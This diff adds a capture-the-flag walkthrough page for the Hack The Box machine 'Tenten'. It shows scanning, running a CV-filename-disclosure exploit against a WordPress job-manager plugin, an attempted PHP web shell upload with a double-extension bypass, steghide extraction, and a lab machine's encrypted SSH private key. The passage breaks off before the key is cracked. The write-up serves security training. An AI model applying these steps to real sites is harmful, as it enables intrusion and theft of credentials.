@@ -1,0 +1,199 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Tenten Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Tenten Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#takis">Shell - takis</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Tenten is not the most straight forward box.  It requires combining an exploit with other interesting information that is found by playing around with the wordpress site.  A hidden encrypted private rsa key is cracked using john.  Once on the box privesc is very easily obtained through sudo permissions.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Tue Oct  5 11:09:26 2021 as: nmap -p- -oN ping_tcp 10.129.1.188&#13;&#10;Nmap scan report for 10.129.1.188&#13;&#10;Host is up (0.044s latency).&#13;&#10;Not shown: 65533 filtered ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Tue Oct  5 11:11:18 2021 -- 1 IP address (1 host up) scanned in 112.07 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Tue Oct  5 11:12:48 2021 as: nmap -p22,80 -sV -sC -oN script_tcp 10.129.1.188&#13;&#10;Nmap scan report for 10.129.1.188&#13;&#10;Host is up (0.041s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)&#13;&#10;|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)&#13;&#10;|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)&#13;&#10;80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))&#13;&#10;|_http-generator: WordPress 4.7.3&#13;&#10;|_http-server-header: Apache/2.4.18 (Ubuntu)&#13;&#10;|_http-title: Job Portal &amp;#8211; Just another WordPress site&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Tue Oct  5 11:13:04 2021 -- 1 IP address (1 host up) scanned in 16.27 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    The website on port 80 brings us to a wordpress site.  I begin by using wpscan to see what I can find out.
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.129.1.188                                                                                                                   130 &Cross;&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;[+] URL: http://10.129.1.188/ [10.129.1.188]&#13;&#10;[+] Started: Tue Oct  5 11:22:16 2021&#13;&#10;&#13;&#10;Interesting Finding(s):&#13;&#10;&#13;&#10;[+] Headers&#13;&#10; | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)&#13;&#10; | Found By: Headers (Passive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] XML-RPC seems to be enabled: http://10.129.1.188/xmlrpc.php&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 100%&#13;&#10; | References:&#13;&#10; |  - http://codex.wordpress.org/XML-RPC_Pingback_API&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/&#13;&#10; |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/&#13;&#10;&#13;&#10;[+] WordPress readme found: http://10.129.1.188/readme.html&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 100%&#13;&#10;&#13;&#10;[+] The external WP-Cron seems to be enabled: http://10.129.1.188/wp-cron.php&#13;&#10; | Found By: Direct Access (Aggressive Detection)&#13;&#10; | Confidence: 60%&#13;&#10; | References:&#13;&#10; |  - https://www.iplocation.net/defend-wordpress-from-ddos&#13;&#10; |  - https://github.com/wpscanteam/wpscan/issues/1299&#13;&#10;&#13;&#10;[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).&#13;&#10; | Found By: Rss Generator (Passive Detection)&#13;&#10; |  - http://10.129.1.188/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;&#13;&#10; |  - http://10.129.1.188/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;&#13;&#10;&#13;&#10;[+] WordPress theme in use: twentyseventeen&#13;&#10; | Location: http://10.129.1.188/wp-content/themes/twentyseventeen/&#13;&#10; | Last Updated: 2021-07-22T00:00:00.000Z&#13;&#10; | Readme: http://10.129.1.188/wp-content/themes/twentyseventeen/README.txt&#13;&#10; | [!] The version is out of date, the latest version is 2.8&#13;&#10; | Style URL: http://10.129.1.188/wp-content/themes/twentyseventeen/style.css?ver=4.7.3&#13;&#10; | Style Name: Twenty Seventeen&#13;&#10; | Style URI: https://wordpress.org/themes/twentyseventeen/&#13;&#10; | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...&#13;&#10; | Author: the WordPress team&#13;&#10; | Author URI: https://wordpress.org/&#13;&#10; |&#13;&#10; | Found By: Css Style In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 1.1 (80% confidence)&#13;&#10; | Found By: Style (Passive Detection)&#13;&#10; |  - http://10.129.1.188/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: &apos;Version: 1.1&apos;&#13;&#10;&#13;&#10;[+] Enumerating All Plugins (via Passive Methods)&#13;&#10;[+] Checking Plugin Versions (via Passive and Aggressive Methods)&#13;&#10;&#13;&#10;[i] Plugin(s) Identified:&#13;&#10;&#13;&#10;[+] job-manager&#13;&#10; | Location: http://10.129.1.188/wp-content/plugins/job-manager/&#13;&#10; | Latest Version: 0.7.25 (up to date)&#13;&#10; | Last Updated: 2015-08-25T22:44:00.000Z&#13;&#10; |&#13;&#10; | Found By: Urls In Homepage (Passive Detection)&#13;&#10; |&#13;&#10; | Version: 7.2.5 (80% confidence)&#13;&#10; | Found By: Readme - Stable Tag (Aggressive Detection)&#13;&#10; |  - http://10.129.1.188/wp-content/plugins/job-manager/readme.txt&#13;&#10;&#13;&#10;[+] Enumerating Config Backups (via Passive and Aggressive Methods)&#13;&#10; Checking Config Backups - Time: 00:00:01 &lt;==============================================================================&gt; (137 / 137) 100.00% Time: 00:00:01&#13;&#10;&#13;&#10;[i] No Config Backups Found.&#13;&#10;&#13;&#10;[!] No WPScan API Token given, as a result vulnerability data has not been output.&#13;&#10;[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register&#13;&#10;&#13;&#10;[+] Finished: Tue Oct  5 11:22:22 2021&#13;&#10;[+] Requests Done: 173&#13;&#10;[+] Cached Requests: 5&#13;&#10;[+] Data Sent: 43.425 KB&#13;&#10;[+] Data Received: 392.304 KB&#13;&#10;[+] Memory used: 211.816 MB&#13;&#10;[+] Elapsed time: 00:00:06
+    </pre>
+
+    <li>The first thing I notice is that this is an outdated WordPress version (4.7.3).  So I use searchsploit to look for an exploit.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit wordpres 4.7.3                          &#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                                                             |  Path&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;WordPress Core &lt; 4.7.4 - Unauthorized Password Reset                                                                       | linux/webapps/41963.txt&#13;&#10;WordPress Core &lt; 4.9.6 - (Authenticated) Arbitrary File Deletion                                                           | php/webapps/44949.txt&#13;&#10;WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                    | multiple/webapps/47690.md&#13;&#10;WordPress Core &lt; 5.3.x - &apos;xmlrpc.php&apos; Denial of Service                                                                    | php/dos/47800.py&#13;&#10;WordPress Plugin Database Backup &lt; 5.2 - Remote Code Execution (Metasploit)                                                | php/remote/47187.rb&#13;&#10;WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities                                                        | php/webapps/39553.txt&#13;&#10;WordPress Plugin EZ SQL Reports &lt; 4.11.37 - Multiple Vulnerabilities                                                       | php/webapps/38176.txt&#13;&#10;WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection                                                                  | php/webapps/44943.txt&#13;&#10;WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection                                                                | php/webapps/48918.sh&#13;&#10;WordPress Plugin User Role Editor &lt; 4.25 - Privilege Escalation                                                            | php/webapps/44595.rb&#13;&#10;WordPress Plugin Userpro &lt; 4.9.17.1 - Authentication Bypass                                                                | php/webapps/43117.txt&#13;&#10;WordPress Plugin UserPro &lt; 4.9.21 - User Registration Privilege Escalation                                                 | php/webapps/46083.txt&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
+
+    <li>The top result returns with an unauthorized password reset exploit.  So I download it and take a look to see what it entails.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit -m 41963&#13;&#10;  Exploit: WordPress Core &lt; 4.7.4 - Unauthorized Password Reset&#13;&#10;      URL: https://www.exploit-db.com/exploits/41963&#13;&#10;     Path: /usr/share/exploitdb/exploits/linux/webapps/41963.txt&#13;&#10;File Type: ASCII text&#13;&#10;&#13;&#10;Copied to: /home/kali/Documents/htb/Tenten/nmap/41963.txt&#13;&#10;&#13;&#10;&#13;&#10;                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ cat 41963.txt &#13;&#10;=============================================&#13;&#10;- Discovered by: Dawid Golunski&#13;&#10;- dawid[at]legalhackers.com&#13;&#10;- https://legalhackers.com&#13;&#10;&#13;&#10;- CVE-2017-8295&#13;&#10;- Release date: 03.05.2017&#13;&#10;- Revision 1.0&#13;&#10;- Severity: Medium/High&#13;&#10;=============================================&#13;&#10;&#13;&#10;Source: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html&#13;&#10;&#13;&#10;If an attacker sends a request similar to the one below to a default Wordpress&#13;&#10;installation that is accessible by the IP address (IP-based vhost):&#13;&#10;                (Removed lines)
+    </pre>
+
+    <li>This exploit allows us to reset a password for a user.  The first thing we want to do is figure out which users exist on this box.  We can do this by using wpscan.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.129.1.188 -e u&#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;            (Removed Lines)&#13;&#10;&#13;&#10;[+] Enumerating Users (via Passive and Aggressive Methods)&#13;&#10; Brute Forcing Author IDs - Time: 00:00:00 &lt;===============================================================================&gt; (10 / 10) 100.00% Time: 00:00:00&#13;&#10;&#13;&#10;[i] User(s) Identified:&#13;&#10;&#13;&#10;[+] takis&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Rss Generator (Passive Detection)&#13;&#10; |  Wp Json Api (Aggressive Detection)&#13;&#10; |   - http://10.129.1.188/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;            (Removed Lines)
+    </pre>
+
+    <li>It looks like the only user we were able to enumerate is "takis".  We will attempt to reset the password for Takis.  After going to the page http://10.129.1.188/wp-login.php, we can click on "Lost your password?".  This will bring us to the reset password page.  We will enter the user Takis and click "Get New Password".  The page returns with a message letting us know that the reset password function is disabled on this box.</li>
+
+    <pre>
+The email could not be sent.&#13;&#10;Possible reason: your host may have disabled the mail() function.
+    </pre>
+
+    <li>So we look for another attack vector.  wpscan also enumerated a plugin on this box, "job-manager".  On the wordpress page there is a link to the job manager portion.  Clicking on "Jobs Listing" will take us to http://10.129.1.188/index.php/jobs/.  We can click on "Apply Now" and it takes us to http://10.129.1.188/index.php/jobs/apply/8/.  We can attempt to upload a web shell on this page but we would need a way to access the uploaded file.  So at this point I do not see a clear path to exploitation.  I take a look and see if I can find an exploit for job manager 7.2.5 (enumerated with the 1st wpscan I did).  I begin with searchsploit.</li>
+
+    <pre>
+&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten/nmap]&#13;&#10;&boxur;&HorizontalLine;$ searchsploit job manager        &#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10; Exploit Title                                                                                                             |  Path&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Plunet BusinessManager 4.1 - &apos;pagesUTF8/auftrag_job.jsp?Pfad&apos; Direct Request Information Disclosure                        | jsp/webapps/32710.txt&#13;&#10;WordPress Plugin Job Manager 0.7.22 - Persistent Cross-Site Scripting                                                      | php/webapps/37738.txt&#13;&#10;WordPress Plugin Job Manager 4.1.0 - Cross-Site Scripting                                                                  | php/webapps/45031.txt&#13;&#10;--------------------------------------------------------------------------------------------------------------------------- ---------------------------------&#13;&#10;Shellcodes: No Results
+    </pre>
+
+    <li>Nothing very interesting turns up in searchsploit so I use google instead.  I googled "wordpress job manager 7.25 exploit" and one of the top results came back with https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-job-manager-security-bypass-0-7-25/ </li>
+    
+    <br>
+
+    <img src="../images/tenten/cve-2015-6668.png">
+
+    <br>
+    <br>
+
+    <li>According to this page we can access the CV files that we upload in job-manager.  The version says 0.7.25, but the numbers are so similar to the one on the box that it is worth trying.  Going to back to my google search I also found an exploit to download from github, https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef.  The script says "CVE-2015-6668" at the top so it appears to be an exploit script for the one we read about on the acunetix website.  I download it.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ wget https://gist.githubusercontent.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef/raw/b73055d21285904c836ea19ce242efe844c74e45/exploit.py&#13;&#10;--2021-10-05 12:01:12--  https://gist.githubusercontent.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef/raw/b73055d21285904c836ea19ce242efe844c74e45/exploit.py&#13;&#10;Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...&#13;&#10;Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.111.133|:443... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 721 [text/plain]&#13;&#10;Saving to: &OpenCurlyQuote;exploit.py&rsquor;&#13;&#10;&#13;&#10;exploit.py                              100%[============================================================================&gt;]     721  --.-KB/s    in 0s      &#13;&#10;&#13;&#10;2021-10-05 12:01:13 (96.6 MB/s) - &OpenCurlyQuote;exploit.py&rsquor; saved [721/721]
+    </pre>
+
+    <li>Now I am going to attempt to upload a php web shell and then access it using the exploit we downloaded.  I fill out the fields with * next to it with anything.  Then I select my php web shell as my CV file.  The web shell I choose has the jpeg magic bytes as well as the .jpeg extension before the .php extension.  Sometimes either or both of these can bypass upload restrictions against php files.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ locate shell | grep jpeg&#13;&#10;/home/kali/Documents/htb/Tenten/shell3.php.jpeg&#13;&#10;/home/kali/Documents/htb/Tenten/shell4.jpeg.php&#13;&#10;/usr/share/payloadsallthethings/Upload Insecure Files/Extension PHP/shell.jpeg.php&#13;&#10;                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ cp &quot;/usr/share/payloadsallthethings/Upload Insecure Files/Extension PHP/shell.jpeg.php&quot; .
+    </pre>
+
+    <br>
+
+    <img src="../images/tenten/cv_upload.png">
+
+    <br>
+    <br>
+
+    <li>It appears we are not going to be allowed to upload our php web shell.</li>
+
+    <br>
+
+    <img src="../images/tenten/webshell_denied.png">
+
+    <br>
+    <br>
+    
+    <li>Now that the php web shell is a dead end we look for yet another attack vector.  However, keeping in mind, we do have our exploit to access files on the wordpress site.</li>
+    
+    <br>
+    <h2><a id="takis">Shell - takis</a></h2>
+
+    <li>After playing around with the # in http://10.129.1.188/index.php/jobs/apply/8/ we notice something interesting.  If we change it to 1, the top of the webpage turns from "Title: Pen Tester" to "Title: Hello world!".  By increasing the # we see other results as well.  This is interesting.  So we use curl to enumerate through more #'s to see what other results we can come up with.  I use a short script to output easy to read results.</li>
+
+    <br>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ for i in $(seq 1 25); do echo -n &quot;/jobs/apply/$i/ -&quot;; curl -s http://10.129.1.188/index.php/jobs/apply/$i/ | grep &quot;&lt;title&gt;&quot;; done;                   1 &Cross;&#13;&#10;/jobs/apply/1/ -&lt;title&gt;Job Application: Hello world! &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/2/ -&lt;title&gt;Job Application: Sample Page &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/3/ -&lt;title&gt;Job Application: Auto Draft &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/4/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/5/ -&lt;title&gt;Job Application: Jobs Listing &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/6/ -&lt;title&gt;Job Application: Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/7/ -&lt;title&gt;Job Application: Register &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/8/ -&lt;title&gt;Job Application: Pen Tester &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/9/ -&lt;title&gt;Job Application:  &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/10/ -&lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/11/ -&lt;title&gt;Job Application: cube &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/12/ -&lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/13/ -&lt;title&gt;Job Application: HackerAccessGranted &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/14/ -&lt;title&gt;Job Application: Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/15/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/16/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/17/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/18/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/19/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/20/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/21/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/22/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/23/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/24/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;&#13;&#10;/jobs/apply/25/ -&lt;title&gt;Job Application &amp;#8211; Job Portal&lt;/title&gt;
+    </pre>
+
+    <li>/job/apply/13/ outputs "HackerAccessGranted", which is interesting.</li>
+
+    <br>
+
+    <li>At this point we have two things to consider.  We have an exploit that allows us to pull files from wordpress and we have an interesting name called "HackerAccessGranted".  We combine both of these facts and we can decide maybe it would be worth looking for a file named "HackerAccessGranted" by using the exploit script.</li>
+
+    <br>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ python exploit.py &#13;&#10;  &#13;&#10;CVE-2015-6668  &#13;&#10;Title: CV filename disclosure on Job-Manager WP Plugin  &#13;&#10;Author: Evangelos Mourikis  &#13;&#10;Blog: https://vagmour.eu  &#13;&#10;Plugin URL: http://www.wp-jobmanager.com  &#13;&#10;Versions: &lt;=0.7.25  &#13;&#10;&#13;&#10;Enter a vulnerable website: http://10.129.1.188 &#13;&#10;Enter a file name: HackerAccessGranted&#13;&#10;[+] URL of CV found! http://10.129.1.188/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+    </pre>
+
+    <li>The script finds a file with that name.  I visit the link.</li>
+
+    <br>
+
+    <img src="../images/tenten/hackeraccessgranted.png">
+
+    <br>
+    <br>
+
+    <li>This looks like it is probably of interest.  I download the picture and analyze it using steghide.</li>
+    
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ wget http://10.129.1.188/wp-content/uploads/2017/04/HackerAccessGranted.jpg                                                                        130 &Cross;&#13;&#10;--2021-10-05 14:31:18--  http://10.129.1.188/wp-content/uploads/2017/04/HackerAccessGranted.jpg&#13;&#10;Connecting to 10.129.1.188:80... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 262408 (256K) [image/jpeg]&#13;&#10;Saving to: &OpenCurlyQuote;HackerAccessGranted.jpg&rsquor;&#13;&#10;&#13;&#10;HackerAccessGranted.jpg                 100%[============================================================================&gt;] 256.26K  1.59MB/s    in 0.2s    &#13;&#10;&#13;&#10;2021-10-05 14:31:18 (1.59 MB/s) - &OpenCurlyQuote;HackerAccessGranted.jpg&rsquor; saved [262408/262408]&#13;&#10;&#13;&#10;                                                                                                                                                             &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb/Tenten]&#13;&#10;&boxur;&HorizontalLine;$ steghide extract -sf ./HackerAccessGranted.jpg&#13;&#10;Enter passphrase: &#13;&#10;wrote extracted data to &quot;id_rsa&quot;.
+    </pre>
+
+    <li>When prompted for a passphrase I just press enter to enter an empty password.  It turns out there is a private SSH key hidden in the image file.</li>
+
+    <pre>
+-----BEGIN RSA PRIVATE KEY-----&#13;&#10;Proc-Type: 4,ENCRYPTED&#13;&#10;DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C&#13;&#10;&#13;&#10;/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax&#13;&#10;tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo&#13;&#10;1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf&#13;&#10;K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm&#13;&#10;SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH&#13;&#10;WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP&#13;&#10;VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT&#13;&#10;J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw&#13;&#10;AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g&#13;&#10;2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo&#13;&#10;6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA&#13;&#10;pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk&#13;&#10;tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm&#13;&#10;KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9&#13;&#10;4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF&#13;&#10;2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7&#13;&#10;L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS&#13;&#10;VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv&#13;&#10;5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r&#13;&#10;Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W&#13;&#10;p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf&#13;&#10;yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB&#13;&#10;9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO&#13;&#10;vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J&#13;&#10;YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP&#13;&#10;-----END RSA PRIVATE KEY-----
+    </pre>
+
+    <li>However, it is encrypted.  So I use ssh2john to create a hash that I can crack.</li>
+
